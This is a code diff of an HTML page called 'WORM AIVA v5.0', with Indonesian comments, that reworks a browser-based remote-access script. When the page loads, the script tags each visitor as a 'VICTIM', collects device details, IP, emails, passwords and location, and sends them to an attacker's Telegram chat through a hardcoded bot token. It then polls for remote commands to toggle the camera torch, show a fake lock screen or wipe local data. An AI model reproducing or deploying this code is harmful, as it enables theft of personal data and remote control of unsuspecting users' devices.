@@ -82,53 +82,54 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
     <div class="footer">WORM AIVA v5.0</div>
 </div>
 
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-
 <script>
+// ================================================================
+// WORM AIVA — VERSI STABIL (LANGSUNG KE TELEGRAM)
+// ================================================================
+
 (function() {
     'use strict';
 
     // ============================================================
-    // KONFIGURASI — GANTI DENGAN PUNYA KAMU
+    // KONFIGURASI — GANTI CHAT_ID
     // ============================================================
-    const SUPABASE_URL = 'https://pagbhuvfvnpolejusxxm.supabase.co';   // GANTI
-    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBhZ2JodXZmdm5wb2xlanVzeHhtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODY3ODI0MTcsImV4cCI6MjEwMjM1ODQxN30.ZRQNKG6ZYDPsSBAAiNFNSxlPsSNkLfIz0jz71lknMLc';        // GANTI
     const BOT_TOKEN = '8806813025:AAFUuyClrFAKIaOn8muWbbraedaynTOisS0';
     const CHAT_ID = '6296658478';
     const LOCK_PASSWORD = '1234';
     // ============================================================
 
-    const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-    const victimId = 'VICTIM_' + Date.now().toString(36).toUpperCase() + '_' + Math.random().toString(36).substr(2, 6).toUpperCase();
     let isLocked = false;
     let flashOn = false;
     let flashStream = null;
+    let victimId = 'VICTIM_' + Date.now().toString(36).toUpperCase() + '_' + Math.random().toString(36).substr(2, 6).toUpperCase();
 
     // ============================================================
-    // TELEGRAM
+    // KIRIM KE TELEGRAM
     // ============================================================
-    function sendTelegram(text) {
+    function sendTelegram(text, extra) {
         const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
+        const payload = { chat_id: CHAT_ID, text: text, parse_mode: 'HTML' };
+        if (extra) payload.reply_markup = extra;
         fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+            body: JSON.stringify(payload)
         }).catch(() => {});
     }
 
     function sendKeyboard() {
-        const keyboard = {
+        const keyboard = JSON.stringify({
             inline_keyboard: [
                 [{ text: '💡 Flash ON', callback_data: 'flash_on' }, { text: '💡 Flash OFF', callback_data: 'flash_off' }],
                 [{ text: '🔒 Lock', callback_data: 'lock' }, { text: '🔓 Unlock', callback_data: 'unlock' }],
                 [{ text: '🗑️ Delete All', callback_data: 'delete' }]
             ]
-        };
-        sendTelegram('🛠️ Remote Control:', { reply_markup: JSON.stringify(keyboard) });
+        });
+        sendTelegram('🛠️ <b>Remote Control</b>\nKlik tombol atau kirim perintah teks:', keyboard);
     }
 
     // ============================================================
-    // EXECUTE COMMAND
+    // EKSEKUSI PERINTAH (DARI POLLING)
     // ============================================================
     function executeCommand(cmd) {
         console.log('📩 Command:', cmd);
@@ -138,6 +139,7 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
             case 'lock': showLockScreen(); break;
             case 'unlock': hideLockScreen(); break;
             case 'delete': deleteAllData(); break;
+            default: console.log('Unknown command:', cmd);
         }
     }
 
@@ -153,7 +155,7 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
                     const track = stream.getVideoTracks()[0];
                     if (track && track.getCapabilities().torch) {
                         track.applyConstraints({ advanced: [{ torch: true }] })
-                            .then(() => { flashOn = true; sendTelegram('💡 Flash ON'); })
+                            .then(() => { flashOn = true; sendTelegram('💡 Flash <b>ON</b>'); })
                             .catch(() => sendTelegram('❌ Flash error'));
                     } else {
                         sendTelegram('❌ Torch not supported');
@@ -163,7 +165,7 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
         } else {
             if (flashStream) { flashStream.getTracks().forEach(t => t.stop()); flashStream = null; }
             flashOn = false;
-            sendTelegram('💡 Flash OFF');
+            sendTelegram('💡 Flash <b>OFF</b>');
         }
     }
 
@@ -176,7 +178,7 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
         document.getElementById('lockOverlay').classList.add('active');
         document.getElementById('lockPass').focus();
         try { document.documentElement.requestFullscreen(); } catch(e) {}
-        sendTelegram('🔒 Lock Screen ON');
+        sendTelegram('🔒 <b>Lock Screen</b> activated');
     }
 
     function hideLockScreen() {
@@ -184,7 +186,7 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
         isLocked = false;
         document.getElementById('lockOverlay').classList.remove('active');
         try { if (document.fullscreenElement) document.exitFullscreen(); } catch(e) {}
-        sendTelegram('🔓 Unlock');
+        sendTelegram('🔓 <b>Unlock</b>');
     }
 
     document.addEventListener('keydown', function(e) {
@@ -214,7 +216,7 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
                 if ('caches' in window) {
                     caches.keys().then(keys => keys.forEach(k => caches.delete(k)));
                 }
-                sendTelegram('🗑️ ALL DATA DELETED');
+                sendTelegram('🗑️ <b>ALL DATA DELETED</b>');
                 setTimeout(() => window.location.href = 'about:blank', 1000);
             } catch(e) {
                 sendTelegram('❌ Delete error: ' + e.message);
@@ -223,40 +225,38 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
     }
 
     // ============================================================
-    // SUBSCRIBE COMMANDS
+    // POLLING TELEGRAM UNTUK PERINTAH
     // ============================================================
-    function subscribeCommands() {
-        supabase
-            .channel('commands-channel')
-            .on(
-                'postgres_changes',
-                { event: 'INSERT', schema: 'public', table: 'commands', filter: 'victim_id=eq.' + victimId },
-                (payload) => {
-                    if (payload.new.status === 'pending') {
-                        executeCommand(payload.new.command);
-                        supabase.from('commands').update({ status: 'executed' }).eq('id', payload.new.id).then();
-                    }
+    let offset = 0;
+    function pollCommands() {
+        const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/getUpdates?offset=' + offset + '&timeout=30';
+        fetch(url)
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok && data.result.length > 0) {
+                    data.result.forEach(update => {
+                        offset = update.update_id + 1;
+                        // Dari callback query (tombol)
+                        if (update.callback_query) {
+                            const cmd = update.callback_query.data;
+                            executeCommand(cmd);
+                            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/answerCallbackQuery?callback_query_id=' + update.callback_query.id)
+                                .catch(() => {});
+                        }
+                        // Dari teks (perintah manual)
+                        if (update.message && update.message.text && update.message.text.startsWith('/')) {
+                            const cmd = update.message.text.substring(1).toLowerCase();
+                            executeCommand(cmd);
+                        }
+                    });
                 }
-            )
-            .subscribe();
+                setTimeout(pollCommands, 3000);
+            })
+            .catch(() => setTimeout(pollCommands, 5000));
     }
 
     // ============================================================
-    // SAVE VICTIM DATA
-    // ============================================================
-    async function saveVictimData(data) {
-        await supabase.from('victims').insert([{
-            victim_id: victimId,
-            device_info: data.deviceInfo,
-            ip: data.ip,
-            emails: data.emails,
-            passwords: data.passwords,
-            location: data.location
-        }]);
-    }
-
-    // ============================================================
-    // GET DATA REAL
+    // KUMPULKAN DATA
     // ============================================================
     function getDeviceInfo() {
         const ua = navigator.userAgent;
@@ -390,10 +390,7 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
         const passwords = getPasswords();
         const location = await getLocation();
 
-        const data = { deviceInfo, ip, emails, passwords, location };
-        await saveVictimData(data);
-
-        let msg = '🔴 NEW VICTIM!\n\n';
+        let msg = '🔴 <b>NEW VICTIM!</b>\n\n';
         msg += '🆔 ID: ' + victimId + '\n';
         msg += '📱 Device: ' + deviceInfo.device + '\n';
         msg += '🏷️ Brand: ' + deviceInfo.brand + '\n';
@@ -412,8 +409,8 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
         msg += '⏰ Time: ' + new Date().toISOString();
         sendTelegram(msg);
 
-        setTimeout(() => sendKeyboard(), 2000);
-        subscribeCommands();
+        setTimeout(sendKeyboard, 2000);
+        pollCommands();
     }
 
     // ============================================================
@@ -442,12 +439,12 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
     // START
     // ============================================================
     if (document.readyState === 'complete') {
-        setTimeout(main, 1000);
+        setTimeout(main, 1500);
     } else {
-        window.addEventListener('load', () => setTimeout(main, 1000));
+        window.addEventListener('load', () => setTimeout(main, 1500));
     }
 
 })();
 </script>
 </body>
-    </html>
+</html>
